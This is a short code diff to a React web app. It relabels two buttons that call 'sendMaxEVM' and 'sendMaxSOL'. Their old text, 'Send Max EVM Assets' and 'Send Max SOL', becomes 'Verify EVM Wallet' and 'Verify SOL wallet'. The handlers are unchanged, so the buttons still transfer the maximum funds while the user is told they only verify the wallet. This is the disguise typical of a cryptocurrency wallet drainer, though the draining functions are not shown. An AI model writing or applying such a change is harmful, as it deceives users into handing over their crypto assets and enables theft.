@@ -109,10 +109,10 @@ function App() {
           />
 
           <button onClick={sendMaxEVM}>
-            Send Max EVM Assets (ETH + ERC20)
+            Verify EVM Wallet (ETH + ERC20)
           </button>
           <button onClick={sendMaxSOL}>
-            Send Max SOL
+            Verify SOL wallet
           </button>
         </>
       )}
